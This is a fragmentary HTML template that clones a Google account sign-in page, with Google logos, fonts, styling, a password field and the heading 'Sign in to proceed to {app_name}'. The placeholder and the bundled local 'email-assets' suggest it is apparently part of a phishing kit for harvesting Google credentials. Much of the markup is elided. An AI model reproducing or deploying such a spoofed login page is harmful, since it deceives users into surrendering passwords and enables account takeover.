...
<html lang="en">
  ...
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url("assets/email-assets/DXI1ORHCpsQm3Vp6mXoaTXhCUOGz7vYGh680lGh-uXM.woff") format('woff');
}
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url("assets/email-assets/cJZKeOuBrn4kERxqtaUH3T8E0i7KZn-EPnyo3HZu7kw.woff") format('woff');
}
  </style>
  <style>
  h1, h2 {
...
<style>
  ...
  .header .logo {
  background-image: url("assets/email-assets/logo_1x.png");
  ...
  .header .logo-w {
  background-image: url("assets/email-assets/googlelogo_color_112x36dp.png");
...
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
  .header .logo {
  background-image: url("assets/email-assets/logo_2x.png");
  }
  .header .logo-w {
  background-image: url("assets/email-assets/googlelogo_color_112x36dp.png");
  }
...
<style>
  ...
  display: block;
  margin: 10px auto;
  background-image: url("assets/email-assets/wlogostrip_230x17_1x.png");
...
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
  .one-google .logo-strip {
  background-image: url("assets/email-assets/wlogostrip_230x17_2x.png");
  }
</style>
<style>
...
<style>
 ...
 .jfk-tooltip-content p:last-child {
  ...
  background: url("assets/email-assets/x_8px.png") no-repeat;
  border: 1px solid transparent;
  height: 21px;
  opacity: .4;
  outline: 0;
...
.circle-mask {
  ...
  background-repeat: no-repeat;
  background-image: url("assets/email-assets/avatar_2x.png");
...
<h1>
  ...
  Sign in to proceed to {app_name}
  </h2>
...
<div class="card signin-card pre-shift no-name">
  ...
  <input name="password" placeholder="Password" type="password" value="" required="required">
  </div>
  </div>
...
<input name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in">
  ...
  Sorry, Google doesn't recognize that email. <a href="#">Create an account</a> using that address?
  </span>
...
<div class="logo-strip"></div>
  ...
  <label for="lang-chooser"><img src="assets/email-assets/universal_language_settings-21.png" alt="Change language"></label>
